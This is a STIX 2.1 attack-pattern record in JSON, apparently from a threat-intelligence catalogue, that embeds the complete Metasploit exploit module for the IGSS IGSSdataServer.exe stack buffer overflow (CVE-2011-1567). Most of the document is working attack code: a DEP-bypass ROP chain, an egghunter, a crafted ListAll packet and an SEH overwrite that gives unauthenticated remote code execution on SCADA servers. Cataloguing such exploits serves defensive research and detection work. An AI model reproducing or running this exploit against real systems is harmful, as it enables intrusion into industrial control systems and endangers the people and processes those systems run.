{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3a117c4f-a7b8-4159-95d4-66b706c34b1a",
    "created": "2024-08-14T16:39:26.380027Z",
    "modified": "2024-08-14T16:39:26.380031Z",
    "name": "\"7-Technologies IGSS IGSSdataServer.exe Stack Buffer Overflow\"",
    "description": " This module exploits a vulnerability in the igssdataserver.exe component of 7-Technologies IGSS up to version 9.00.00 b11063. While processing a ListAll command, the application fails to do proper bounds checking before copying data into a small buffer on the stack. This causes a buffer overflow and allows to overwrite a structured exception handling record on the stack, allowing for unauthenticated remote code execution.  Also, after the payload exits, IGSSdataServer.exe should automatically recover.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/igss9_igssdataserver_listall.rb",
            "external_id": "igss9_igssdataserver_listall.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1567"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/igss_2-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-11-132-01A"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Egghunter\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"7-Technologies IGSS IGSSdataServer.exe Stack Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability in the igssdataserver.exe component of 7-Technologies\n        IGSS up to version 9.00.00 b11063. While processing a ListAll command, the application\n        fails to do proper bounds checking before copying data into a small buffer on the stack.\n        This causes a buffer overflow and allows to overwrite a structured exception handling record\n        on the stack, allowing for unauthenticated remote code execution.  Also, after the payload\n        exits, IGSSdataServer.exe should automatically recover.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma', #Initial discovery, poc\n          'Lincoln',        #Metasploit\n          'corelanc0d3r <peter.ve[at]corelan.be>',   #Rop exploit, combined XP SP3 & 2003 Server\n          'sinn3r',         #Serious Msf style policing\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-1567'],\n          ['OSVDB', '72353'],\n          ['URL', 'http://aluigi.altervista.org/adv/igss_2-adv.txt'],\n          ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-11-132-01A']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP3/2003 Server R2 SP2 (DEP Bypass)',\n            {\n              'Ret'    => 0x1b77ca8c,  #dao360.dll pivot 1388 bytes\n              'Offset' => 500\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-03-24',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        Opt::RPORT(12401)\n      ])\n  end\n\n  def junk\n    return rand_text(4).unpack(\"L\")[0].to_i\n  end\n\n  def exploit\n\n    eggoptions =\n    {\n      :checksum => false,\n      :eggtag => 'w00t',\n      :depmethod => 'virtualprotect',\n      :depreg => 'esi'\n    }\n\n    badchars = \"\\x00\"\n    hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)\n\n    #dao360.dll - pvefindaddr rop 'n roll\n    rop_chain = [\n      0x1b7681c4,  # rop nop\n      0x1b7681c4,  # rop nop\n      0x1b7681c4,  # rop nop\n      0x1b7681c4,  # rop nop\n      0x1b7681c4,  # rop nop\n      0x1b7681c4,  # rop nop\n      0x1b7681c4,  # rop nop\n      0x1b7681c4,  # rop nop\n      0x1b7681c4,  # rop nop\n      0x1b7681c4,  # rop nop\n      0x1b72f174,  # POP EAX # RETN 08\n      0xA1A10101,\n      0x1b7762a8,  # ADD EAX,5E5F0000 # RETN 08\n      junk,\n      junk,\n      0x1b73a55c,  # XCHG EAX,EBX # RETN\n      junk,\n      junk,\n      0x1b724004,  # pop ebp\n      0x1b72f15f,  # &push esp # retn 8\n      0x1b72f040,  # POP ECX # RETN\n      0x1B78F010,  # writeable\n      0x1b7681c2,  # xor eax,eax # retn\n      0x1b72495c,  # add al,40 # mov [esi+4],eax # pop esi # retn 4\n      0x41414141,\n      0x1b76a883,  # XCHG EAX,ESI # RETN 00\n      junk,\n      0x1b7785c1,  # XOR EDX,EDX # CMP EAX,54 # SETE DL # MOV EAX,EDX # ADD ESP,8 # RETN 0C\n      junk,\n      junk,\n      0x1b78535c,  # ADD EDX,ESI # SUB EAX,EDX # MOV DWORD PTR DS:[ECX+F8],EAX # XOR EAX,EAX # POP ESI # RETN 10\n      junk,\n      junk,\n      junk,\n      junk,\n      0x1b7280b4,  # POP EDI # XOR EAX,EAX # POP ESI # RETN\n      junk,\n      junk,\n      junk,\n      junk,\n      0x1b7681c4,  # rop nop (edi)\n      0x90909090,  # esi -> eax -> nop\n      0x1b72f174,  # POP EAX # RETN 08\n      0xA1F50214,  # offset to &VirtualProtect\n      0x1b7762a8,  # ADD EAX,5E5F0000 # RETN 08\n      junk,\n      junk,\n      0x1b73f3bd,  # MOV EAX,DWORD PTR DS:[EAX] # RETN\n      junk,\n      junk,\n      0x1b76a883,  # XCHG EAX,ESI # RETN 00\n      0x1b72f040,  # pop ecx\n      0x1B78F010,  # writeable (ecx)\n      0x1b764716,  # PUSHAD # RETN\n    ].pack('V*')\n\n    header  = \"\\x00\\x04\"  #Size\n    header << \"\\x01\\x00\\x34\\x12\"\n    header << \"\\x0D\"      #Opcode\n    header << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    header << \"\\x01\"      #Flag\n    header << \"\\x00\\x00\\x00\"\n    header << \"\\x01\"      #Command (ListAll)\n    header << \"\\x00\\x00\\x00\"\n    header << rand_text(14)\n    sploit = rop_chain\n    sploit << \"\\x90\" * 10\n    sploit << hunter\n    sploit << rand_text(target['Offset'] - (sploit.length))\n    sploit << [target.ret].pack('V')\n    sploit << egg\n    sploit << rand_text(2000)\n\n    connect\n    print_status(\"Sending request...\")\n    sock.put(header + sploit)\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-24",
    "x_mitre_platforms": [
        "win'"
    ]
}